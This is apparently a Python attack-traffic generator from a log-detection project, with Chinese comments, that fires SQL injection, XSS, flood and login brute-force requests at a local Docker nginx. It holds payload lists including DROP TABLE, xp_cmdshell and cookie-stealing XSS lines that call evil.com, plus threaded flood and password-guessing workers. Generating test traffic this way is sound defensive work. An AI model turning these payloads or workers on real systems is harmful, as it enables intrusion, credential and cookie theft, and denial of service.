"""
攻击模拟器 (Member B)
向 Docker nginx 发送真实的恶意 HTTP 请求，触发真实日志
支持四种攻击模式：SQL注入 / XSS / CC洪水 / 暴力破解
"""

import time
import random
import threading
import sys
from pathlib import Path
from datetime import datetime

# 添加项目根目录到 Python 路径
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import requests
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel

from src.config import ATTACK_CONFIG, NGINX_PORT

console = Console()

# ============================================
# 攻击 Payload 库
# ============================================
SQL_INJECTION_PAYLOADS = [
    "/product?id=1' OR '1'='1",
    "/product?id=1; DROP TABLE users--",
    "/product?id=1' UNION SELECT * FROM admin--",
    "/product?id=1' AND 1=2 UNION SELECT username,password FROM users--",
    "/search?q=admin'--",
    "/search?q=1' OR 1=1--",
    "/login?user=admin' OR 1=1--",
    "/login?user=admin'--",
    "/product?id=-1' UNION SELECT 1,2,3--",
    "/product?id=1' AND SLEEP(5)--",
    "/product?id=1' AND '1'='1",
    "/product?id=1'; EXEC xp_cmdshell('dir')--",
]

XSS_PAYLOADS = [
    "/search?q=<script>alert('XSS')</script>",
    "/search?q=<img src=x onerror=alert(document.cookie)>",
    "/search?q=<svg onload=alert(1)>",
    "/search?q=javascript:alert('XSS')",
    "/search?q=<body onload=alert('XSS')>",
    "/search?q=<iframe src=javascript:alert('XSS')>",
    "/comment?text=<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "/search?q=<img src=x onerror=fetch('http://evil.com/steal?c='+document.cookie)>",
]

CC_PAYLOADS = [
    "/",
    "/about",
    "/products",
    "/contact",
    "/blog",
    "/api/status",
    "/search?q=test",
    "/product?id=1",
]

BRUTE_FORCE_USERNAMES = [
    "admin", "root", "user", "test", "guest", "manager",
    "support", "info", "webmaster", "administrator",
]
BRUTE_FORCE_PASSWORDS = [
    "password", "123456", "admin123", "password123", "qwerty",
    "letmein", "welcome", "monkey", "dragon", "master",
]


class AttackSimulator:
    """攻击模拟器 —— 向 Docker nginx 发送真实攻击流量"""

    def __init__(self):
        self.base_url = f"http://localhost:{NGINX_PORT}"
        self.active_attacks: dict[str, threading.Thread] = {}
        self.attack_stats: dict[str, dict] = {}
        self.session = requests.Session()

    # ============================================
    # SQL 注入攻击
    # ============================================
    def _sql_injection_worker(self, attacker_ip: str, count: int, delay: float):
        """SQL注入攻击线程"""
        stats = {"sent": 0, "errors": 0}
        for i in range(count):
            payload = random.choice(SQL_INJECTION_PAYLOADS)
            headers = {"X-Forwarded-For": attacker_ip}
            try:
                resp = self.session.get(
                    f"{self.base_url}{payload}",
                    headers=headers,
                    timeout=5
                )
                stats["sent"] += 1
            except Exception:
                stats["errors"] += 1
            time.sleep(delay)
        self.attack_stats["sql_injection"] = stats

    def launch_sql_injection(self, attacker_ip: str = "10.0.0.100"):
        """启动 SQL 注入攻击"""
        config = ATTACK_CONFIG["sql_injection"]
        console.print(f"\n[bold red]💉 SQL注入扫描攻击 启动！[/bold red]")
        console.print(f"   攻击IP: {attacker_ip} | 线程: {config['threads']} | 每线程请求: {config['requests_per_thread']}")

        threads = []
        for i in range(config["threads"]):
            t = threading.Thread(
                target=self._sql_injection_worker,
                args=(attacker_ip, config["requests_per_thread"], config["delay_between_requests"]),
                daemon=True,
            )
            threads.append(t)
            t.start()

        def wait_all():
            for t in threads:
                t.join()
            console.print("[bold green]✅ SQL注入攻击完成[/bold green]")

        threading.Thread(target=wait_all, daemon=True).start()

    # ============================================
    # XSS 攻击
    # ============================================
    def _xss_worker(self, attacker_ip: str, count: int, delay: float):
        """XSS攻击线程"""
        stats = {"sent": 0, "errors": 0}
        for i in range(count):
            payload = random.choice(XSS_PAYLOADS)
            headers = {"X-Forwarded-For": attacker_ip}
            try:
                resp = self.session.get(
                    f"{self.base_url}{payload}",
                    headers=headers,
                    timeout=5
                )
                stats["sent"] += 1
            except Exception:
                stats["errors"] += 1
            time.sleep(delay)
        self.attack_stats["xss"] = stats

    def launch_xss(self, attacker_ip: str = "10.0.0.200"):
        """启动 XSS 攻击"""
        config = ATTACK_CONFIG["xss"]
        console.print(f"\n[bold yellow]⚠ XSS 跨站脚本攻击 启动！[/bold yellow]")
        console.print(f"   攻击IP: {attacker_ip} | 线程: {config['threads']} | 每线程请求: {config['requests_per_thread']}")

        threads = []
        for i in range(config["threads"]):
            t = threading.Thread(
                target=self._xss_worker,
                args=(attacker_ip, config["requests_per_thread"], config["delay_between_requests"]),
                daemon=True,
            )
            threads.append(t)
            t.start()

        threading.Thread(target=lambda: [t.join() for t in threads], daemon=True).start()

    # ============================================
    # CC 并发洪水攻击
    # ============================================
    def _cc_flood_worker(self, attacker_ip: str, count: int, delay: float):
        """CC洪水攻击线程"""
        stats = {"sent": 0, "errors": 0}
        for i in range(count):
            payload = random.choice(CC_PAYLOADS)
            headers = {"X-Forwarded-For": attacker_ip}
            try:
                resp = self.session.get(
                    f"{self.base_url}{payload}",
                    headers=headers,
                    timeout=5
                )
                stats["sent"] += 1
            except Exception:
                stats["errors"] += 1
            if delay > 0:
                time.sleep(delay)
        self.attack_stats["cc_flood"] = stats

    def launch_cc_flood(self, attacker_ip: str = "10.0.0.50"):
        """启动 CC 并发洪水攻击"""
        config = ATTACK_CONFIG["cc_flood"]
        console.print(f"\n[bold red]🌊 CC并发洪水攻击 启动！[/bold red]")
        console.print(f"   攻击IP: {attacker_ip} | 线程: {config['threads']} | 每线程请求: {config['requests_per_thread']}")

        threads = []
        for i in range(config["threads"]):
            t = threading.Thread(
                target=self._cc_flood_worker,
                args=(attacker_ip, config["requests_per_thread"], config["delay_between_requests"]),
                daemon=True,
            )
            threads.append(t)
            t.start()

        threading.Thread(target=lambda: [t.join() for t in threads], daemon=True).start()

    # ============================================
    # SSH 暴力破解
    # ============================================
    def _brute_force_worker(self, attacker_ip: str, count: int, delay: float):
        """暴力破解线程 - 模拟大量登录失败"""
        stats = {"sent": 0, "errors": 0}
        for i in range(count):
            username = random.choice(BRUTE_FORCE_USERNAMES)
            password = random.choice(BRUTE_FORCE_PASSWORDS)
            headers = {
                "X-Forwarded-For": attacker_ip,
                "User-Agent": "Mozilla/5.0 (hydra brute force tool)",
            }
            try:
                resp = self.session.post(
                    f"{self.base_url}/login",
                    data={"user": username, "pass": password},
                    headers=headers,
                    timeout=5
                )
                stats["sent"] += 1
            except Exception:
                stats["errors"] += 1
            time.sleep(delay)
        self.attack_stats["brute_force"] = stats

    def launch_brute_force(self, attacker_ip: str = "172.16.0.100"):
        """启动暴力破解攻击"""
        config = ATTACK_CONFIG["brute_force"]
        console.print(f"\n[bold magenta]🔓 SSH暴力破解攻击 启动！[/bold magenta]")
        console.print(f"   攻击IP: {attacker_ip} | 线程: {config['threads']} | 每线程尝试: {config['attempts_per_thread']}")

        threads = []
        for i in range(config["threads"]):
            t = threading.Thread(
                target=self._brute_force_worker,
                args=(attacker_ip, config["attempts_per_thread"], config["delay_between_attempts"]),
                daemon=True,
            )
            threads.append(t)
            t.start()

        threading.Thread(target=lambda: [t.join() for t in threads], daemon=True).start()

    # ============================================
    # 便捷方法
    # ============================================
    def launch_attack(self, attack_type: str):
        """根据类型启动攻击"""
        attack_map = {
            "sql_injection": self.launch_sql_injection,
            "xss": self.launch_xss,
            "cc_flood": self.launch_cc_flood,
            "brute_force": self.launch_brute_force,
        }
        if attack_type not in attack_map:
            console.print(f"[red]未知攻击类型: {attack_type}[/red]")
            return
        attack_map[attack_type]()

    def get_stats(self) -> dict:
        """获取攻击统计"""
        return self.attack_stats

    def get_stats_table(self) -> Table:
        """生成攻击统计表格"""
        table = Table(title="攻击统计")
        table.add_column("攻击类型", style="cyan")
        table.add_column("已发送", style="yellow")
        table.add_column("错误", style="red")
        for atype, stats in self.attack_stats.items():
            table.add_row(atype, str(stats.get("sent", 0)), str(stats.get("errors", 0)))
        return table


if __name__ == "__main__":
    sim = AttackSimulator()
    console.print(Panel.fit("[bold]🚀 攻击模拟器测试[/bold]", border_style="red"))

    sim.launch_sql_injection()
    time.sleep(3)
    sim.launch_xss()
    time.sleep(3)
    sim.launch_cc_flood()
    time.sleep(5)

    console.print(sim.get_stats_table())
